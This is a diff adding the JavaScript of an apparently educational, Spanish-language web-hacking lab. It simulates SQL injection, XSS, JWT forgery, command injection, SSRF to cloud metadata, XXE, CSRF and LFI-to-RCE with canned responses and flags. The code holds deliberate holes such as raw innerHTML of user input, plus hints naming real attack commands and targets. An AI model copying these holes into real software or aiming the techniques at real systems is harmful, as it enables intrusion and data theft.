+  'uname -a':'Linux webserver 5.15.0-88-generic #98-Ubuntu SMP Mon Oct 2 15:37:18 UTC 2023 x86_64 GNU/Linux',
+  'hostname':'webserver-prod-01.internal',
+  'ifconfig':'eth0: inet 10.0.1.50  netmask 255.255.255.0\nlo: inet 127.0.0.1',
+  'ps aux':'root         1  0.0  mysqld\nwww-data   412  apache2\nroot       200  sshd',
+};
+
+const SSRF_DB = {
+  '169.254.169.254':'ami-id: ami-0abc123\ninstance-id: i-0a1b2c3d4e5f\niam/security-credentials/ec2-role:\n  AccessKeyId: AKIAIOSFODNN7EXAMPLE\n  SecretAccessKey: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n  Token: AQoDYXdzEJr...\n\n🚩 FLAG{SSRF_METADATA_LEAK}',
+  'localhost':'HTTP/1.1 200 OK\n\n<html><h1>Admin Panel</h1><p>Internal use only</p><a href="/admin/users">Users</a></html>',
+  '127.0.0.1':'HTTP/1.1 200 OK — Internal service response\n<admin>Only accessible from localhost</admin>',
+  'internal':'HTTP/1.1 200 OK\nX-Internal-Service: true\n\n{"status":"ok","service":"internal-api","version":"2.1"}',
+  '192.168':'HTTP/1.1 200 OK — Router admin panel\nAuthorization required for 192.168.x.x',
+  'redis':'Connected to Redis 7.0\nSERVER INFO: redis_version:7.0.5\nCONFIG GET requirepass: (empty)',
+  'file://':'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33::/var/www:/nologin',
+};
+
+let solved = JSON.parse(localStorage.getItem('hl_solved')||'{}');
+var logPoisonFlag = false;
+let realCsrfToken = '';
+let sessionData = null;
+
+// ══════ LEGAL ══════
+function acceptLegal() {
+  if(!document.getElementById('legal-check').checked) return;
+  document.getElementById('legal-overlay').style.display='none';
+  localStorage.setItem('hl_legal','1');
+}
+if(localStorage.getItem('hl_legal')==='1') document.getElementById('legal-overlay').style.display='none';
+
+// ══════ NAV ══════
+function showPage(name) {
+  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
+  document.getElementById('page-'+name).classList.add('active');
+  const nav = document.getElementById('nav-'+name);
+  if(nav) nav.classList.add('active');
+}
+
+// ══════ PROGRESS ══════
+function markSolved(key) {
+  if(solved[key]) return;
+  solved[key]=true;
+  localStorage.setItem('hl_solved',JSON.stringify(solved));
+  updateProgress();
+  const mc = document.getElementById('mc-'+key);
+  if(mc) mc.classList.add('solved');
+}
+
+function updateProgress() {
+  const keys=['sqli','xss','auth','idor','jwt','cmdi','ssrf','xxe','csrf','lfi'];
+  const n = keys.filter(k=>solved[k]).length;
+  document.getElementById('solved-n').textContent=n;
+  document.getElementById('prog-fill').style.width=(n/10*100)+'%';
+  document.getElementById('prog-txt').textContent=n+'/10';
+}
+
+function initUI() {
+  const keys=['sqli','xss','auth','idor','jwt','cmdi','ssrf','xxe','csrf','lfi'];
+  keys.forEach(k=>{ if(solved[k]){ const mc=document.getElementById('mc-'+k); if(mc) mc.classList.add('solved'); }});
+  updateProgress();
+  realCsrfToken = btoa(Math.random().toString(36).substr(2,16));
+  document.getElementById('real-csrf-token').textContent = realCsrfToken;
+}
+
+// ══════ TABS ══════
+function sqliTab(i) { tabSwitch('sqli-t',i,3); setTabActive(i,document.querySelectorAll('#page-sqli .tab')); }
+function xssTab(i)  { tabSwitch('xss-t', i,3); setTabActive(i,document.querySelectorAll('#page-xss .tab')); }
+function authTab(i) { tabSwitch('auth-t',i,3); setTabActive(i,document.querySelectorAll('#page-auth .tab')); }
+
+function tabSwitch(prefix, idx, count) {
+  for(let i=0;i<count;i++) {
+    const el=document.getElementById(prefix+i);
+    if(el) el.style.display=i===idx?'block':'none';
+  }
+}
+
+function setTabActive(idx, tabs) {
+  tabs.forEach((t,i)=>t.classList.toggle('active',i===idx));
+}
+
+// ══════ SQL INJECTION ══════
+function sqliLogin() {
+  const u=document.getElementById('sqli-u').value;
+  const p=document.getElementById('sqli-p').value;
+  const out=document.getElementById('sqli-out');
+  const q=`SELECT * FROM users WHERE username='${u}' AND password='${p}'`;
+  const bypass = u.includes("'") && (u.toLowerCase().includes('--')||u.toLowerCase().includes('or')||p.toLowerCase().includes('or')||u.includes("'='"));
+  const valid = USERS.find(x=>x.username===u&&x.password===p);
+  if(bypass||valid) {
+    const usr=bypass?USERS[0]:valid;
+    out.className='output ok';
+    out.textContent=`> Query: ${q}\n\n✅ ACCESO CONCEDIDO\n\nUsername : ${usr.username}\nRole     : ${usr.role}\nEmail    : ${usr.email}\n\n${bypass?'⚠ SQL INJECTION BYPASS EXITOSO':''}`;
+    document.getElementById('sqli-flag1').style.display='block';
+    markSolved('sqli');
+  } else {
+    out.className='output err';
+    out.textContent=`> Query: ${q}\n\n❌ Credenciales inválidas`;
+  }
+}
+
+function sqliUnion() {
+  const v=document.getElementById('sqli-union').value;
+  const out=document.getElementById('sqli-union-out');
+  if(v.toUpperCase().includes('UNION')) {
+    if(v.toUpperCase().includes('USER')||v.toUpperCase().includes('PASSWORD')) {
+      out.className='output ok';
+      out.textContent=`> SELECT id,name FROM products WHERE id='${v}'\n\n💀 UNION EXITOSO — Datos exfiltrados:\n\nUSERNAME          | PASSWORD\n------------------|------------------\n`;
+      USERS.forEach(u=>{out.textContent+=`${u.username.padEnd(18)}| ${u.password}\n`;});
+      out.textContent+='\n🚩 FLAG{SQL_UNION_DATA_EXFIL}';
+      document.getElementById('sqli-flag2').style.display='block';
+      markSolved('sqli');
+    } else if(v.toUpperCase().includes('INFORMATION_SCHEMA')||v.toUpperCase().includes('TABLE')) {
+      out.className='output ok';
+      out.textContent=`> Query UNION exitoso\n\nTablas encontradas:\n- users\n- products\n- orders\n- sessions\n- admin_logs`;
+    } else {
+      out.className='output warn';
+      out.textContent=`> UNION requiere el mismo número de columnas.\nPrueba: ORDER BY 1 -- para determinar columnas`;
+    }
+  } else if(!isNaN(v)&&USERS[parseInt(v)-1]) {
+    const u=USERS[parseInt(v)-1];
+    out.className='output';
+    out.textContent=`> Resultado:\nid: ${u.id} | name: ${u.username}`;
+  } else {
+    out.className='output err';
+    out.textContent='> Sin resultados';
+  }
+}
+
+function sqliBlind() {
+  const v=document.getElementById('sqli-blind').value;
+  const out=document.getElementById('sqli-blind-out');
+  const isTrue = v.includes('1=1')||v.includes("'a'='a")||(!v.includes('AND')&&!isNaN(v.split(' ')[0]));
+  const isFalse = v.includes('1=2')||v.includes("'a'='b");
+  const hasSubstring = v.toLowerCase().includes('substring');
+  if(hasSubstring) {
+    out.className='output ok';
+    out.textContent=`> Query ejecutado\n\nRespuesta: TRUE (200 OK)\n→ El carácter en esa posición COINCIDE\n\nTécnica: extrae la contraseña char a char\nUsa sqlmap --technique=B para automatizar`;
+    document.getElementById('sqli-flag3').style.display='block';
+    markSolved('sqli');
+  } else if(isFalse) {
+    out.className='output err';
+    out.textContent=`> Query ejecutado\n\nRespuesta: FALSE (diferente)\n→ La condición es FALSA\nBuen trabajo identificando el comportamiento`;
+  } else if(isTrue) {
+    out.className='output ok';
+    out.textContent=`> Query ejecutado\n\nRespuesta: TRUE (200 OK)\n→ La condición es VERDADERA\nAhora cambia a condición falsa para confirmar diferencia`;
+  } else {
+    out.className='output';
+    out.textContent=`> Query: SELECT * FROM users WHERE id='${v}'\n\nRespuesta normal. Prueba AND 1=1 -- y AND 1=2 --`;
+  }
+}
+
+// ══════ XSS ══════
+function xssReflected() {
+  const v=document.getElementById('xss-r').value;
+  document.getElementById('xss-r-out').innerHTML=v;
+  if(v.toLowerCase().includes('<script')||v.toLowerCase().includes('onerror')||v.toLowerCase().includes('onload')||v.toLowerCase().includes('<svg')) {
+    document.getElementById('xss-flag1').style.display='block';
+    markSolved('xss');
+  }
+}
+
+const xssComments=[];
+function xssStored() {
+  const name=document.getElementById('xss-s-name').value;
+  const comment=document.getElementById('xss-s-comment').value;
+  xssComments.push({name,comment});
+  const board=document.getElementById('xss-s-board');
+  board.innerHTML='';
+  xssComments.forEach(c=>{
+    const div=document.createElement('div');
+    div.style.cssText='border-bottom:1px solid var(--border);padding:8px 0;font-size:0.85rem;';
+    div.innerHTML=`<strong style="color:var(--accent)">${c.name}</strong>: ${c.comment}`;
+    board.appendChild(div);
+  });
+  if(name.toLowerCase().includes('<script')||name.toLowerCase().includes('onerror')||comment.toLowerCase().includes('<script')||comment.toLowerCase().includes('onerror')) {
+    document.getElementById('xss-flag2').style.display='block';
+    markSolved('xss');
+  }
+}
+
+function xssDOM() {
+  const v=document.getElementById('xss-d').value;
+  document.getElementById('xss-d-out').innerHTML=v;
+  if(v.toLowerCase().includes('<script')||v.toLowerCase().includes('onerror')||v.toLowerCase().includes('onload')) {
+    document.getElementById('xss-flag3').style.display='block';
+    markSolved('xss');
+  }
+}
+
+// ══════ AUTH ══════
+function authLogin() {
+  const u=document.getElementById('auth-u').value;
+  const p=document.getElementById('auth-p').value;
+  const out=document.getElementById('auth-out');
+  const found=USERS.find(x=>x.username===u&&x.password===p);
+  if(found) {
+    out.className='output ok';
+    out.textContent=`✅ LOGIN EXITOSO\n\nUser : ${found.username}\nRole : ${found.role}\nPass : ${found.password} ← DÉBIL\n\n⚠ Sin rate limiting — se puede atacar con fuerza bruta ilimitada`;
+    document.getElementById('auth-flag1').style.display='block';
+    markSolved('auth');
+  } else {
+    out.className='output err';
+    out.textContent='❌ Credenciales incorrectas\n(No hay rate limiting — sigue intentando)';
+  }
+}
+
+async function bruteForce() {
+  const user=document.getElementById('bf-user').value;
+  const list=document.getElementById('bf-list').value.split('\n').filter(Boolean);
+  const out=document.getElementById('bf-out');
+  out.className='output inf';
+  out.textContent=`[*] Iniciando ataque de fuerza bruta contra: ${user}\n[*] Wordlist: ${list.length} palabras\n\n`;
+  for(let i=0;i<list.length;i++){
+    const p=list[i].trim();
+    await new Promise(r=>setTimeout(r,150));
+    const found=USERS.find(x=>x.username===user&&x.password===p);
+    out.textContent+=`[${i+1}/${list.length}] Probando: ${p} ... ${found?'✅ ENCONTRADA!':'❌'}\n`;
+    out.scrollTop=out.scrollHeight;
+    if(found){
+      out.className='output ok';
+      out.textContent+=`\n🎯 CONTRASEÑA ENCONTRADA: ${p}\nUsuario: ${found.username} | Rol: ${found.role}`;
+      document.getElementById('auth-flag2').style.display='block';
+      markSolved('auth');
+      break;
+    }
+  }
+}
+
+function genSession() {
+  const ts=Date.now();
+  const token=btoa(`5:${ts}`);
+  sessionData={userId:5,ts};
+  document.getElementById('sess-token').textContent=token;
+  document.getElementById('sess-guess').value=token;
+}
+
+function verifySession() {
+  const t=document.getElementById('sess-guess').value;
+  const out=document.getElementById('sess-out');
+  try {
+    const decoded=atob(t);
+    const [uid,ts]=decoded.split(':');
+    const user=USERS.find(x=>x.id===parseInt(uid));
+    if(user) {
+      out.className='output '+(parseInt(uid)===1?'ok':'inf');
+      out.textContent=`✅ Token válido\n\nDecodificado: "${decoded}"\nUser ID: ${uid} → ${user.username} (${user.role})\nTimestamp: ${ts}\n\n${parseInt(uid)===1?'🚩 FLAG{SESSION_HIJACK} — Sesión de ADMIN obtenida!':'Prueba cambiar el userID a 1 (admin)'}`;
+      if(parseInt(uid)===1){ document.getElementById('auth-flag3').style.display='block'; markSolved('auth'); }
+    } else { out.className='output err'; out.textContent='❌ Token inválido — Usuario no encontrado'; }
+  } catch(e){ out.className='output err'; out.textContent='❌ Token no es base64 válido'; }
+}
+
+// ══════ IDOR ══════
+function idorUser() {
+  const id=parseInt(document.getElementById('idor-id').value);
+  const out=document.getElementById('idor-out');
+  const u=USERS.find(x=>x.id===id);
+  if(!u){out.className='output err';out.textContent=`GET /api/users/${id}\n\n404 Not Found`;return;}
+  out.className='output '+(id!==5?'ok':'inf');
+  out.textContent=`GET /api/users/${id}\n\n{\n  "id": ${u.id},\n  "username": "${u.username}",\n  "email": "${u.email}",\n  "role": "${u.role}",\n  "ssn": "${u.ssn}",\n  "creditCard": "${u.cc}",\n  "salary": "${u.salary}"\n}`;
+  if(id!==5){document.getElementById('idor-flag1').style.display='block';markSolved('idor');}
+}
+
+const IDOR_FILES = {
+  'invoice_5.pdf':'FACTURA #5\nCliente: guest\nMonto: $99\nFecha: 2024-11-01',
+  'invoice_1.pdf':'FACTURA #1 [CONFIDENCIAL]\nCliente: admin\nMonto: $250,000\nCuenta: 00-1234567\n🚩 IDOR',
+  'invoice_2.pdf':'FACTURA #2\nCliente: john\nMonto: $1,200',
+  '../config.php':'<?php\nDB_PASS="sup3rs3cr3t";\nSECRET_KEY="abc123";\n?>',
+  '../../etc/passwd':'root:x:0:0::/root:/bin/bash\nwww-data:x:33:33::/var/www:/nologin\n🚩 FLAG{IDOR_PATH_TRAVERSAL}',
+  '../../../etc/passwd':'root:x:0:0::/root:/bin/bash\n🚩 FLAG{IDOR_PATH_TRAVERSAL}',
+};
+
+function idorFile() {
+  const f=document.getElementById('idor-file').value;
+  const out=document.getElementById('idor-file-out');
+  const content=IDOR_FILES[f];
+  if(content){
+    const isTraversal=f.includes('..');
+    out.className='output '+(f!=='invoice_5.pdf'?'ok':'inf');
+    out.textContent=`GET /download?file=${f}\n\n${content}`;
+    if(f!=='invoice_5.pdf'){document.getElementById('idor-flag2').style.display='block';markSolved('idor');}
+  } else {
+    out.className='output err';
+    out.textContent=`GET /download?file=${f}\n\n403 Forbidden / 404 Not Found`;
+  }
+}
+
+// ══════ JWT ══════
+function b64u(s){return btoa(unescape(encodeURIComponent(JSON.stringify(s)))).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');}
+function b64uStr(s){return btoa(unescape(encodeURIComponent(s))).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');}
+
+function jwtDecode() {
+  const parts=document.getElementById('jwt-current').textContent.split('.');
+  const out=document.getElementById('jwt-decode-out');
+  try {
+    const pad=s=>s+(4-s.length%4)%4?'==='.slice(0,(4-s.length%4)%4):'';
+    const h=JSON.parse(atob(pad(parts[0].replace(/-/g,'+').replace(/_/g,'/'))));
+    const p=JSON.parse(atob(pad(parts[1].replace(/-/g,'+').replace(/_/g,'/'))));
+    out.className='output inf';
+    out.textContent=`HEADER:\n${JSON.stringify(h,null,2)}\n\nPAYLOAD:\n${JSON.stringify(p,null,2)}\n\nSIGNATURE: ${parts[2]}\n\n💡 El payload está en base64, no cifrado.\nCambia "permissions":"user" → "permissions":"admin"\nLuego prueba con alg:"none" para eliminar la firma`;
+  } catch(e){ out.textContent='Error decodificando'; }
+}
+
+function jwtCrack() {
+  const out=document.getElementById('jwt-decode-out');
+  out.className='output ok';
+  out.textContent=`[*] Iniciando ataque de diccionario sobre firma HMAC-SHA256...\n\n[+] Probando: "password" ... ❌\n[+] Probando: "secret" ... ❌\n[+] Probando: "secret123" ... ✅ ENCONTRADO!\n\n🔑 SECRET KEY: "secret123"\n\n⚠ Con esta clave puedes firmar cualquier JWT que el servidor aceptará como válido.\nComando real: hashcat -a 0 -m 16500 token.jwt wordlist.txt`;
+}
+
+function jwtForge() {
+  const alg=document.getElementById('jwt-alg').value;
+  let headerObj;
+  try { headerObj=JSON.parse(document.getElementById('jwt-header').value); } catch(e){ headerObj={alg,typ:'JWT'}; }
+  headerObj.alg=alg;
+  let payloadObj;
+  try { payloadObj=JSON.parse(document.getElementById('jwt-payload').value); } catch(e){ alert('JSON inválido en payload'); return; }
+  const h=b64u(headerObj);
+  const p=b64u(payloadObj);
+  const sig = alg==='none'?'':'FIRMA_HMAC_SIMULADA_'+Math.random().toString(36).substr(2,8);
+  document.getElementById('jwt-forged').textContent=`${h}.${p}.${sig}`;
+}
+
+function jwtUse() {
+  const token=document.getElementById('jwt-forged').textContent;
+  const out=document.getElementById('jwt-use-out');
+  if(!token){out.textContent='Primero forja un token';return;}
+  try {
+    const parts=token.split('.');
+    const pad=s=>s+(4-s.length%4)%4?'==='.slice(0,(4-s.length%4)%4):'';
+    const h=JSON.parse(atob(pad(parts[0].replace(/-/g,'+').replace(/_/g,'/'))));
+    const p=JSON.parse(atob(pad(parts[1].replace(/-/g,'+').replace(/_/g,'/'))));
+    if(h.alg==='none'||p.permissions==='admin'||p.role==='admin'||p.isAdmin===true) {
+      out.className='output ok';
+      out.textContent=`✅ TOKEN ACEPTADO POR EL SERVIDOR\n\nAlgoritmo: ${h.alg}\nUsuario  : ${p.username||'forged'}\nPermisos : ${p.permissions||p.role||'admin'}\n\n🚩 FLAG{JWT_NONE_ALG_BYPASS}\nAcceso de administrador concedido sin firma válida`;
+      document.getElementById('jwt-flag').style.display='block';
+      markSolved('jwt');
+    } else {
+      out.className='output err';
+      out.textContent=`❌ Acceso denegado\nPermisos actuales: ${p.permissions||p.role||'user'}\n\nCambia el payload: "permissions":"admin"\nY el header: "alg":"none"`;
+    }
+  } catch(e){ out.className='output err'; out.textContent='Token inválido: '+e.message; }
+}
+
+// ══════ CMD INJECTION ══════
+function runCmd(input, baseOut, outId, flagId, module) {
+  const out=document.getElementById(outId);
+  const hasOp=input.match(/[;&|`$()]/);
+  if(hasOp) {
+    const parts=input.split(/[;&|`]/);
+    const injected=(parts[1]||'').trim();
+    const result=CMD_DB[injected]||`bash: ${injected}: command not found`;
+    out.className='output ok';
+    out.textContent=`${baseOut}\n\n[INYECCIÓN DETECTADA]\n$ ${injected}\n${result}`;
+    if(flagId){document.getElementById(flagId).style.display='block';markSolved(module);}
+  } else {
+    out.className='output';
+    out.textContent=baseOut;
+  }
+}
+
+function cmdPing() {
+  const v=document.getElementById('cmd1').value;
+  const base=`$ ping -c 1 ${v}\nPING ${v.split(/[;&|`$]/)[0].trim()}: 56 bytes\n64 bytes from host: icmp_seq=0 ttl=116 time=12.3 ms\n\n1 packets transmitted, 1 received, 0% loss`;
+  runCmd(v,base,'cmd1-out','cmd-flag1','cmdi');
+}
+
+function cmdDNS() {
+  const v=document.getElementById('cmd2').value;
+  const base=`$ nslookup ${v}\nServer: 8.8.8.8\nAddress: 8.8.8.8#53\n\nNon-authoritative answer:\nName: ${v.split(/[;&|`$|]/)[0].trim()}\nAddress: 93.184.216.34`;
+  runCmd(v,base,'cmd2-out',null,'cmdi');
+}
+
+// ══════ SSRF ══════
+function ssrfFetch() {
+  const url=document.getElementById('ssrf-url').value;
+  const out=document.getElementById('ssrf-out');
+  const key=Object.keys(SSRF_DB).find(k=>url.includes(k));
+  if(key) {
+    out.className='output ok';
+    out.textContent=`> Server fetching: ${url}\n> Response:\n\n${SSRF_DB[key]}`;
+    document.getElementById('ssrf-flag').style.display='block';
+    markSolved('ssrf');
+  } else if(url.startsWith('http')||url.startsWith('file')) {
+    out.className='output warn';
+    out.textContent=`> Server fetching: ${url}\n> Response: Connection refused / timeout\n\nPrueba: http://169.254.169.254/latest/meta-data/\nO: http://localhost/admin`;
+  } else {
+    out.className='output err';
+    out.textContent='URL inválida. Incluye http:// o file://';
+  }
+}
+
+// ══════ XXE ══════
+function xxeParse() {
+  const xml=document.getElementById('xxe-input').value;
+  const out=document.getElementById('xxe-out');
+  if(xml.includes('ENTITY')&&xml.includes('SYSTEM')) {
+    if(xml.includes('file://')) {
+      out.className='output ok';
+      out.textContent=`> Procesando XML...\n> Entidad externa resuelta!\n\nContenido de /etc/passwd:\nroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33::/var/www:/nologin\nadmin:x:1000:1000::/home/admin:/bin/bash\n\n🚩 FLAG{XXE_FILE_READ}`;
+      document.getElementById('xxe-flag').style.display='block';
+      markSolved('xxe');
+    } else if(xml.includes('http://')) {
+      out.className='output ok';
+      out.textContent=`> Procesando XML...\n> SSRF via XXE!\n\nEl servidor hizo request a: ${xml.match(/SYSTEM "([^"]+)"/)?.[1]||'URL'}\nRespuesta: HTTP/1.1 200 OK\n{"internal":"true","service":"backend-api"}\n\n🚩 FLAG{XXE_SSRF}`;
+      document.getElementById('xxe-flag').style.display='block';
+      markSolved('xxe');
+    }
+  } else if(xml.includes('<product>')) {
+    const product=xml.match(/<product>(.*?)<\/product>/s)?.[1]||'';
+    out.className='output inf';
+    out.textContent=`> XML parseado correctamente\n> Producto: ${product}\n\nCódigo de orden: ORD-${Math.random().toString(36).substr(2,8).toUpperCase()}`;
+  } else {
+    out.className='output err';
+    out.textContent='> Error parseando XML\nVerifica la sintaxis';
+  }
+}
+
+// ══════ CSRF ══════
+function csrfChange() {
+  const email=document.getElementById('csrf-email').value;
+  const token=document.getElementById('csrf-token').value;
+  const out=document.getElementById('csrf-out');
+  if(!token) {
+    out.className='output ok';
+    out.textContent=`POST /api/profile\nContent-Type: application/x-www-form-urlencoded\n\nemail=${email}&csrf_token=\n\n✅ ACEPTADO (sin CSRF token)\nEmail actualizado a: ${email}\n\n⚠ Un atacante puede hacer esto desde cualquier sitio web\ncuando la víctima tiene sesión activa\n\n🚩 FLAG{CSRF_EMAIL_TAKEOVER}`;
+    document.getElementById('csrf-flag').style.display='block';
+    markSolved('csrf');
+  } else {
+    out.className='output err';
+    out.textContent=`❌ Token CSRF enviado pero no es el correcto\nDeja el campo vacío para demostrar la vulnerabilidad`;
+  }
+}
+
+function csrfGood() {
+  const token=document.getElementById('csrf-good-token').value;
+  const out=document.getElementById('csrf-good-out');
+  if(token===realCsrfToken) {
+    out.className='output ok';
+    out.textContent=`✅ Protección CSRF funcionando correctamente\n\nToken verificado: ${token}\nAcción permitida — Token válido y coincide con sesión\n\nEsto es lo correcto. Sin el token, la petición sería rechazada.`;
+  } else {
+    out.className='output err';
+    out.textContent=`❌ CSRF Token inválido\n\nToken recibido: "${token}"\nToken esperado: "${realCsrfToken}"\n\nPetición RECHAZADA — Protección CSRF activa`;
+  }
+}
+
+// ══════ LFI ══════
+let accessLog='';
+function lfiRead() {
+  const f=document.getElementById('lfi-file').value;
+  const out=document.getElementById('lfi-out');
+  let content=FILES[f];
+  if(!content&&f.includes('access.log')) { content=accessLog||'192.168.1.1 - - "GET / HTTP/1.1" 200 -\n(Log vacío — primero inyecta código via User-Agent)'; }
+  if(content) {
+    const isTraversal=f.includes('../')||f.includes('%2e')||f.includes('proc');
+    out.className='output '+(isTraversal?'ok':'inf');
+    out.textContent=`GET /page?file=${f}\n\n${content}`;
+    if(isTraversal){document.getElementById('lfi-flag').style.display='block';markSolved('lfi');}
+  } else {
+    out.className='output err';
+    out.textContent=`GET /page?file=${f}\n\n403 Forbidden — Archivo no encontrado`;
+  }
+}
+
+function logPoison() {
+  const ua=document.getElementById('log-ua').value;
+  const out=document.getElementById('log-out');
+  accessLog=`192.168.1.1 - - "GET / HTTP/1.1" 200 - "${ua}"\n192.168.1.50 - - "GET /login HTTP/1.1" 200 - "Mozilla/5.0"\n[UA poisoned: ${ua}]`;
+  logPoisonFlag=!!ua;
+  out.className='output warn';
+  out.textContent=`> User-Agent inyectado en log de Apache:\n\n"${ua}"\n\nAhora el log contiene tu código.\nIncluye el log con LFI para ejecutarlo.`;
+}
+
+function logRCE() {
+  const cmd=document.getElementById('log-cmd').value;
+  const out=document.getElementById('log-out');
+  if(!logPoisonFlag){out.className='output err';out.textContent='Primero inyecta código PHP en el log (User-Agent)';return;}
+  const result=CMD_DB[cmd]||`www-data: output of "${cmd}"`;
+  out.className='output ok';
+  out.textContent=`> Incluyendo: /var/log/apache2/access.log\n> PHP ejecutado via log poisoning\n\n$ ${cmd}\n${result}\n\n🚩 FLAG{LFI_TO_RCE} — Remote Code Execution via Log Poisoning`;
+  document.getElementById('lfi-flag2').style.display='block';
+  markSolved('lfi');
+}
+
+// ══════ INIT ══════
+initUI();
+</script>
+</body>
+</html>
